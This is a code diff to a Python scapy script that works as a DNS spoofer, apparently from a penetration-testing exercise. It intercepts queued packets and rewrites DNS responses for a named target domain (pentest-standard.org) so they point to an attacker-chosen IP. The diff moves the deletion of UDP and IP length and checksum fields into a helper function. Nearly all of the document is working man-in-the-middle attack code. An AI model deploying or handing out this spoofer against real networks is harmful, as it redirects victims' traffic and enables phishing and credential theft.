@@ -11,22 +11,27 @@ target_DN = "www.pentest-standard.org"
 # pentest-standard.org
 # 96.126.116.56
 
+def del_fields(scapy_packet):
+    if scapy_packet[UDP]:
+        del scapy_packet[UDP].len
+        del scapy_packet[UDP].chksum
+    if scapy_packet[IP]:
+        del scapy_packet[IP].len
+        del scapy_packet[IP].chksum
+    return scapy_packet
+
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
     if scapy_packet.haslayer(DNSRR):
-        # print(scapy_packet.show())
         qname = scapy_packet[DNSQR].qname
         if target_DN in qname:
-            print("[+] Spoofing Target: " + target_DN)
+            print("[+] Spoofer for: " + qname)
             answer = DNSRR(rrname=qname, rdata=new_target_ip)
             scapy_packet[DNS].an = answer
             scapy_packet[DNS].ancount = 1
-            # del scapy_packet[DNS].rdlen
-            # del scapy_packet[DNS].ttl
-            del scapy_packet[UDP].len
-            del scapy_packet[UDP].chksum
-            del scapy_packet[IP].chksum
-            # print(scapy_packet.show()) Works up to this point
+
+            scapy_packet = del_fields(scapy_packet)
+
             packet.set_payload(str(scapy_packet))
     packet.accept()
 
